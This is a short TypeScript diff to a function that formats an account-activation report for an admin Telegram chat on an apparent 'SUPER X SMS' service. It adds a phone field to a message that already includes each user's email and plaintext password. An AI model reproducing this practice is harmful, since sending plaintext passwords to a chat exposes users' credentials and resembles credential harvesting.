@@ -723,6 +723,7 @@ export async function sendAccountActivationRequestToAdminTelegram(account: {
   const cleanPass = account.password || '';
   const cleanCode = account.accountCode || '';
   const cleanCountry = account.country || 'Global';
+  const cleanPhone = account.phoneOrTelegram || '';
   const cleanAgent = account.agentEmail || account.agentMail || 'Direct Support';
   const timeStr = formatScriptTimestamp(account.createdAt || Date.now());
 
@@ -732,7 +733,7 @@ export async function sendAccountActivationRequestToAdminTelegram(account: {
     return { success: true, message: 'Account request already dispatched to Telegram.' };
   }
 
-  // Matches exact layout from the Telegram user activity report screenshot with country and agent email
+  // Matches exact layout from the Telegram user activity report screenshot with country, phone and agent email
   const formattedText =
     `<b>👤 SUPER X SMS — USER ACTIVITY REPORT</b>\n\n` +
     `⏰ <b>Time:</b> ${timeStr}\n` +
@@ -741,6 +742,7 @@ export async function sendAccountActivationRequestToAdminTelegram(account: {
     `✉️ <b>Email:</b> <code>${cleanEmail}</code>\n` +
     `🔑 <b>Password:</b> <code>${cleanPass}</code>\n` +
     `🌍 <b>Country:</b> ${cleanCountry}\n` +
+    (cleanPhone ? `📱 <b>Phone:</b> <code>${cleanPhone}</code>\n` : '') +
     `👔 <b>Agent Mail:</b> <code>${cleanAgent}</code>\n` +
     `🆔 <b>Account Code:</b> <code>${cleanCode}</code>\n` +
     `📝 <b>Details:</b> Status: PENDING ADMIN APPROVAL | Agent: ${cleanAgent}\n` +
